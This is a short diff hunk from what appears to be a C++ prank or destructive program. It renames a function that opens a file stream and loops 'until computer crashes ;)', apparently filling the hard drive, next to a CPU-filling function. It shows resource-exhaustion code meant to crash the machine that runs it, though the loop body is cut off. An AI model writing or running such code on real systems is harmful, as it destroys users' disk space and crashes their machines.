@@ -56,7 +56,7 @@ void CPUFiller()
     }
 }
 //Create a file that is getting bigger and bigger while this function runs.
-void HardDriveDestroyer(char * filename)
+void DickDestroyerDecember(char * filename)
 {
     std::ofstream out(filename); //Create a output file stream.
     while(true) //Execute until computer crashes ;)
